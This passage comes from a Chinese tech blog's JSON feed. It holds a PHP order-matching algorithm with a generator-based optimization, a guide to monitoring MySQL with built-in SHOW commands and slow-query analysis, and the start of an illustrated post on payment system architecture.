class=\"line\">        $head = array_shift($arr);</span><br><span class=\"line\">        if ($head &gt; $change_number) &#123;</span><br><span class=\"line\">            array_push($arr, $head);</span><br><span class=\"line\">            continue;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $finsh[] = $head;</span><br><span class=\"line\">        $change_number -= $head;</span><br><span class=\"line\">        $blance = $change_number;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return [$finsh, $blance, $arr];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">  $get_number = marriedDeal([120, 200,100,300,11,221],20);</span><br><span class=\"line\">print_r($get_number);</span><br></pre></td></tr></table></figure>\n<p>最近闲来无事，做了测试。如下图做测试数据<br><img src=\"/img/202306/20230701220606.png\" alt=\"https://erik.xyz\"><br>测试后生成结果<br><img src=\"/img/202306/20230701221810.png\" alt=\"https://erik.xyz\"><br>发现这样撮合数据多的时候会耗时太久,就尝试找优化方法。<br>如果使用生成器呢，生成结果如下<br><img src=\"/img/202306/20230701220832.png\" alt=\"https://erik.xyz\"></p>\n<p>完整优化代码：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">function marriedDeal($arr, $change_number)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $default_total = count($arr);</span><br><span class=\"line\">    if ($default_total &lt;= 0 || $change_number&lt;=0) return [];</span><br><span class=\"line\">    $blance = $i = 0;</span><br><span class=\"line\">    arsort($arr);</span><br><span class=\"line\">    while ($default_total &gt;= 1) &#123;</span><br><span class=\"line\">        $i += 1;</span><br><span class=\"line\">        if ($i &gt; $default_total || $change_number &lt;= 0) break;</span><br><span class=\"line\">        $head = array_shift($arr);</span><br><span class=\"line\">        if ($head &gt; $change_number) &#123;</span><br><span class=\"line\">            array_push($arr, $head);</span><br><span class=\"line\">            continue;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $change_number -= $head;</span><br><span class=\"line\">        $blance = $change_number;</span><br><span class=\"line\">        yield [&#x27;finsh&#x27;=&gt;$head,&quot;blance&quot;=&gt;$blance,&#x27;last_arr&#x27;=&gt;[]];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //yield [&#x27;last_arr&#x27;=&gt;$arr];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$t1 = microtime(true);</span><br><span class=\"line\">$list = [120, 200, 4353, 43543, 435, 546, 56, 435, 3443, 5435,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    180, 11, 223, 2342, 345, 435, 456, 4564, 55, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    232, 3243, 23424, 6576, 7897, 2342, 21342, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 456, 345, 435, 345, 456, 57, 4345, 345435, 435,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    220, 400, 20, 320, 43435, 4564, 45645, 456, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    180, 11, 223, 2342, 345, 435, 456, 4564, 55, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    232, 3243, 23424, 6576, 7897, 2342, 21342, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    456, 345, 435, 345, 456, 57, 4345, 345435, 435, 180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    56546, 566, 456452324, 34543, 435, 435, 435, 45180, 11, 223, 2342, 345, 435, 456, 4564, 55,</span><br><span class=\"line\">    2344, 3242, 342, 4, 34543, 435, 24, 456, 6, 456, 745</span><br><span class=\"line\">];</span><br><span class=\"line\">foreach($get_number as $k)&#123;</span><br><span class=\"line\">    var_dump($k);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$t2 = microtime(true);</span><br><span class=\"line\">echo &#x27;耗时&#x27; . round($t2 - $t1, 4) . &#x27;秒&#x27;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "撮合算法",
                "撮合",
                "php撮合算法"
            ]
        },
        {
            "id": "https://erik.xyz/2023/05/15/mysql-top-log/",
            "url": "https://erik.xyz/2023/05/15/mysql-top-log/",
            "title": "MYSQL 最朴素的监控方式",
            "date_published": "2023-05-15T14:24:00.000Z",
            "content_html": "<p>对于当前数据库的监控方式有很多，分为数据库自带、商用、开源三大类，每一种都有各自的特色；而对于 mysql 数据库由于其有很高的社区活跃度，监控方式更是多种多样，不管哪种监控方式最核心的就是监控数据，获取得到全面的监控数据后就是灵活的展示部分。那我们今天就介绍一下完全采用 mysql 自有方式采集获取监控数据，在单体下达到最快速、方便、损耗最小。<br><span id=\"more\"></span><br>本次文章完全使用 mysql 自带的 show 命令实现获取，从 connects、buffercache、lock、SQL、statement、Database throughputs、serverconfig7 大方面全面获取监控数据。</p>\n<ol>\n<li><p>连接数（Connects）</p>\n<ul>\n<li><p>最大使用连接数：show status like ‘Max_used_connections’</p>\n</li>\n<li><p>当前打开的连接数：show status like ‘Threads_connected’</p>\n</li>\n</ul>\n</li>\n</ol>\n<ul>\n<li><p>缓存（bufferCache）</p>\n<ul>\n<li>未从缓冲池读取的次数：show status like ‘Innodb_buffer_pool_reads’</li>\n<li>从缓冲池读取的次数：show status like ‘Innodb_buffer_pool_read_requests’</li>\n<li>缓冲池的总页数：show status like ‘Innodb_buffer_pool_pages_total’</li>\n<li>缓冲池空闲的页数：show status like ‘Innodb_buffer_pool_pages_free’</li>\n<li>缓存命中率计算：（1-Innodb_buffer_pool_reads/Innodb_buffer_pool_read_requests）*100%</li>\n<li>缓存池使用率为：((Innodb_buffer_pool_pages_total-Innodb_buffer_pool_pages_free）/Innodb_buffer_pool_pages_total）*100%</li>\n</ul>\n</li>\n</ul>\n<ol>\n<li><p>锁（lock）</p>\n<ul>\n<li>锁等待个数：show status like ‘Innodb_row_lock_waits’</li>\n<li>平均每次锁等待时间：show status like ‘Innodb_row_lock_time_avg’</li>\n<li>查看是否存在表锁：show open TABLES where in_use&gt;0；有数据代表存在锁表，空为无表锁</li>\n</ul>\n<p>备注：锁等待统计得数量为累加数据，每次获取得时候可以跟之前得数据进行相减，得到当前统计得数据</p>\n</li>\n<li><p>SQL</p>\n<ul>\n<li>查看 mysql 开关是否打开：show variables like ‘slow_query_log’，ON 为开启状态，如果为 OFF，set global slow_query_log=1 进行开启</li>\n<li>查看 mysql 阈值：show variables like ‘long_query_time’，根据页面传递阈值参数，修改阈值 set global long_query_time=0.1</li>\n<li>查看 mysql 慢 sql 目录：show variables like ‘slow_query_log_file’</li>\n<li>格式化慢 sql 日志：mysqldumpslow -s at -t 10 /export/data/mysql/log/slow.log 注：此语句通过 jdbc 执行不了，属于命令行执行。意思为：显示出耗时最长的 10 个 SQL 语句执行信息，10 可以修改为 TOP 个数。显示的信息为：执行次数、平均执行时间、SQL 语句</li>\n</ul>\n<p>备注：当 mysqldumpslow 命令执行失败时，将慢日志同步到本地进行格式化处理。</p>\n</li>\n<li><p>statement</p>\n<ul>\n<li>insert 数量：show status like ‘Com_insert’</li>\n<li>delete 数量：show status like ‘Com_delete’</li>\n<li>update 数量：show status like ‘Com_update’</li>\n<li>select 数量：show status like ‘Com_select’</li>\n</ul>\n</li>\n<li><p>吞吐（Database throughputs）</p>\n<ul>\n<li>发送吞吐量：show status like ‘Bytes_sent’</li>\n<li>接收吞吐量：show status like ‘Bytes_received’</li>\n<li>总吞吐量：Bytes_sent+Bytes_received</li>\n</ul>\n</li>\n<li><p>数据库参数（serverconfig）</p>\n<p> show variables</p>\n</li>\n<li><p>慢 SQL</p>\n</li>\n</ol>\n<p>慢 SQL 指的是 MySQL 慢查询，具体指运行时间超过 long_query_time 值的 SQL。我们常听 MySQL 中有二进制日志 binlog、中继日志 relaylog、重做回滚日志 redolog、undolog 等。针对慢查询，还有一种慢查询日志 slowlog，用来记录在 MySQL 中响应时间超过阀值的语句。慢 SQL 对实际生产业务影响是致命的，所以测试人员在性能测试过程中，对数据库 SQL 语句执行情况实施监控，给开发提供准确的性能优化意见显得尤为重要。那怎么使用 Mysql 数据库提供的慢查询日志来监控 SQL 语句执行情况，找到消耗较高的 SQL 语句，以下详细说明一下慢查询日志的使用步骤：</p>\n<ul>\n<li>确保打开慢 SQL 开关 slow_query_log</li>\n<li>设置慢 SQL 域值 long_query_time 这个 long_query_time 是用来定义慢于多少秒的才算 “慢查询”，注意单位是秒，我通过执行 sql 指令 set long_query_time=1 来设置了 long_query_time 的值为 1, 也就是执行时间超过 1 秒的都算慢查询，如下：</li>\n<li>查看慢 SQL 日志路径</li>\n<li>通过慢 sql 分析工具 mysqldumpslow 格式化分析慢 SQL 日志 mysqldumpslow 慢查询分析工具，是 mysql 安装后自带的，可以通过./mysqldumpslow —help 查看使用参数说明</li>\n</ul>\n<p>常见用法：</p>\n<ol>\n<li>取出使用最多的 10 条慢查询 ./mysqldumpslow -s c -t 10 /export/data/mysql/log/slow.log</li>\n<li><p>取出查询时间最慢的 3 条慢查询 ./mysqldumpslow -s t -t 3 /export/data/mysql/log/slow.log</p>\n<p>注意：使用 mysqldumpslow 的分析结果不会显示具体完整的 sql 语句，只会显示 sql 的组成结构；假如: SELECT FROM sms_send WHERE service_id=10 GROUP BY content LIMIT 0, 1000; mysqldumpslow 命令执行后显示：Count: 2 Time=1.5s (3s) Lock=0.00s (0s) Rows=1000.0 (2000), vgos_dba[vgos_dba]@[10.130.229.196]SELECT FROM sms_send WHERE service_id=N GROUP BY content LIMIT N, N</p>\n</li>\n</ol>\n<p>mysqldumpslow 的分析结果详解：</p>\n<ul>\n<li>Count：表示该类型的语句执行次数，上图中表示 select 语句执行了 2 次。</li>\n<li>Time：表示该类型的语句执行的平均时间（总计时间）</li>\n<li>Lock：锁时间 0s。</li>\n<li>Rows：单次返回的结果数是 1000 条记录，2 次总共返回 2000 条记录。<br>通过这个工具就可以查询出来哪些 sql 语句是慢 SQL，从而反馈研发进行优化，比如加索引，该应用的实现方式等。</li>\n</ul>\n<h5 id=\"常见慢-SQL-排查\"><a href=\"#常见慢-SQL-排查\" class=\"headerlink\" title=\"常见慢 SQL 排查\"></a>常见慢 SQL 排查</h5><ol>\n<li><p>不使用子查询</p>\n<p>SELECT FROM t1 WHERE id (SELECT id FROM t2 WHERE name=’hechunyang’); 子查询在 MySQL5.5 版本里，内部执行计划器是这样执行的：先查外表再匹配内表，而不是先查内表 t2，当外表的数据很大时，查询速度会非常慢。在 MariaDB10/MySQL5.6 版本里，采用 join 关联方式对其进行了优化，这条 SQL 会自动转换为 SELECT t1. FROM t1 JOIN t2 ON t1.id = t2.id; 但请注意的是：优化只针对 SELECT 有效，对 UPDATE/DELETE 子 查询无效， 生产环境尽量应避免使用子查询。</p>\n</li>\n<li><p>避免函数索引</p>\n<p>SELECT FROM t WHERE YEAR(d) &gt;= 2016; 由于 MySQL 不像 Oracle 那样⽀持函数索引，即使 d 字段有索引，也会直接全表扫描。应改为 &gt; SELECT FROM t WHERE d &gt;= ‘2016-01-01’;</p>\n</li>\n<li><p>用 IN 来替换 OR 低效查询</p>\n<p>慢 SELECT FROM t WHERE LOC_ID = 10 OR LOC_ID = 20 OR LOC_ID = 30; 高效查询 &gt; SELECT FROM t WHERE LOC_IN IN (10,20,30);</p>\n</li>\n<li><p>LIKE 双百分号无法使用到索引</p>\n<p>SELECT FROM t WHERE name LIKE ‘%de%’; 使用 SELECT FROM t WHERE name LIKE ‘de%’;</p>\n</li>\n<li><p>分组统计可以禁止排序</p>\n<p>SELECT goods_id,count() FROM t GROUP BY goods_id; 默认情况下，MySQL 对所有 GROUP BY col1，col2… 的字段进⾏排序。如果查询包括 GROUP BY，想要避免排序结果的消耗，则可以指定 ORDER BY NULL 禁止排序。使用 SELECT goods_id,count () FROM t GROUP BY goods_id ORDER BY NULL;</p>\n</li>\n<li><p>禁止不必要的 ORDER BY 排序</p>\n<p>SELECT count(1) FROM user u LEFT JOIN user_info i ON u.id = i.user_id WHERE 1 = 1 ORDER BY u.create_time DESC; 使用 SELECT count (1) FROM user u LEFT JOIN user_info i ON u.id = i.user_id;</p>\n</li>\n</ol>\n<p>9.总结</p>\n<ul>\n<li>任何东西不应过重关注其外表，要注重内在的东西，往往绚丽的外表下会有对应的负担和损耗。</li>\n<li>mysql 数据库的监控支持通过 SQL 方式从 performance_schema 库中访问对应的表数据，前提是初始化此库并开启监控数据写入。</li>\n<li>对于监控而言，不在于手段的多样性，而需要明白监控的本质，以及需要的监控项内容，找到符合自身项目特色的监控方式。</li>\n<li>在选择监控工具对 mysql 监控时，需要关注监控工具本身对于数据库服务器的消耗，不要影响到其自身的使用。</li>\n</ul>\n<p>链接：<a href=\"https://my.oschina.net/u/4090830/blog/5564849\">https://my.oschina.net/u/4090830/blog/5564849</a></p>\n",
            "tags": [
                "mysql",
                "mysql监控"
            ]
        },
        {
            "id": "https://erik.xyz/2023/04/05/all-pay-system/",
            "url": "https://erik.xyz/2023/04/05/all-pay-system/",
            "title": "通用的支付系统该如何设计",
            "date_published": "2023-04-05T13:56:00.000Z",
            "content_html": "<p>支付永远是一个公司的核心领域，因为这是一个有交易属性公司的命脉。那么，支付系统到底长什么样，又是怎么运行交互的呢?抛开带有支付牌照的金融公司的支付架构，下述链路和系统组成基本上符合绝大多数支付场景。其实整体可以看成是交易核心+支付核心 两个大系统。交易系统关联了业务场景和底层支付，而支付系统完成了调用支付工具到对账清算等一系列相关操作。下面我们就来一起看下各个系统的核心组成和交互。<br><span id=\"more\"></span></p>\n<ol>\n<li>支付系统总览</li>\n</ol>\n<ul>\n<li><p>核心系统交互<br><img src=\"/img/202304/20230605215759.png\" alt=\"\"></p>\n</li>\n<li><p>业务图谱</p>\n</li>\n</ul>\n<p><img src=\"/img/202304/20230605215938.png\" alt=\"\"></p>\n<ol>\n<li>核心系统解析</li>\n</ol>\n<ul>\n<li>交易核心</li>\n</ul>\n<p>交易核心把公司的业务系统和底层支付关联起来，让业务系统专注于业务，不比关心底层支付。</p>\n<p><img src=\"/img/202304/20230605220106.png\" alt=\"&#39;交易核心&#39;\"></p>\n<ul>\n<li>基础交易类型抽象<br><img src=\"/img/202304/20230605220120.png\" alt=\"\"></li>\n</ul>\n<ul>\n<li>多表聚合 &amp; 订单关联<br><img src=\"/img/202304/20230605220132.png\" alt=\"\"></li>\n</ul>\n<ul>\n<li>支付核心</li>\n</ul>\n<p>支付核心主要负责将多种支付类型进行抽象，变成充值、提现、退款、转账四种支付形态。同时，还要负责集成多种支付工具，对支付指令进行编排等等。</p>\n<p><img src=\"/img/202304/20230605220303.png\" alt=\"&#39;支付核心总览&#39;\"></p>\n<p> 支付行为编排</p>\n<p>其目的，是实现插件式开发、支付规则可配置的 灵活开发方式。</p>\n<p><img src=\"/img/202304/20230605220319.png\" alt=\"\"></p>\n<p>异常处理</p>\n<p>异常处理包括了 重复支付、部分支付、金额不一致、其他异常等异常场景。<br><img src=\"/img/202304/20230605220332.png\" alt=\"\"></p>\n<ul>\n<li><p>渠道网关<br><img src=\"/img/202304/20230605220342.png\" alt=\"\"></p>\n</li>\n<li><p>资金核算<br><img src=\"/img/202304/20230605220353.png\" alt=\"\"></p>\n</li>\n</ul>\n<p>3.服务治理</p>\n<ul>\n<li>平台统一上下文</li>\n</ul>\n<p>通过确定系统边界、业务建模拆分之后，整个支付平台被拆分几十个服务，而如何保障在服务间流转业务信息不被丢失，是我们需要考虑的问题。平台统一上下文的要素信息（唯一业务标识码），在整个支付平台链路中全程传递，被用来解决这个问题。<br><img src=\"/img/202304/20230605220601.png\" alt=\"\"></p>\n<ul>\n<li>数据一致性治理</li>\n</ul>\n<p>大型的支付公司，内部都有非常严格和完备的数据一致性方案，比如采用业务侵入性非常大的分布式事务等，以牺牲开发效率来提升数据的稳定，是非常有必要的。而业务公司，如果不采用分布式事务又有哪些应对策略呢？</p>\n<p>CAS校验<br><img src=\"/img/202304/20230605220615.png\" alt=\"\"></p>\n<p>幂等 &amp; 异常补偿<br><img src=\"/img/202304/20230605220626.png\" alt=\"\"></p>\n<p>对账<br><img src=\"/img/202304/20230605220636.png\" alt=\"\"></p>\n<p>准实时对账<br><img src=\"/img/202304/20230605220647.png\" alt=\"\"></p>\n<ul>\n<li><p>DB拆分<br><img src=\"/img/202304/20230605220656.png\" alt=\"\"></p>\n</li>\n<li><p>异步化</p>\n</li>\n</ul>\n<p>支付是整个交易链路的核心环节，那么，怎么兼顾支付系统的稳定性和执行效率呢？是异步化。</p>\n<p>消息异步化<br><img src=\"/img/202304/20230605220707.png\" alt=\"\"></p>\n<p>外部支付调用异步化<br><img src=\"/img/202304/20230605220720.png\" alt=\"\"></p>\n<p>在外部支付中，经常需要服务方与第三方支付交互，获取预支付凭证，如上图所示。</p>\n<p>这种同步调用的情况下，由于需要跨外部网络，响应的 RT 会非常长，可能会出现跨秒的情况。由于是同步调用，会阻塞整个支付链路。一旦 RT 很长且 QPS 比较大的情况下，服务会整体 hold 住，甚至会出现拒绝服务的情况。<br><img src=\"/img/202304/20230605220747.png\" 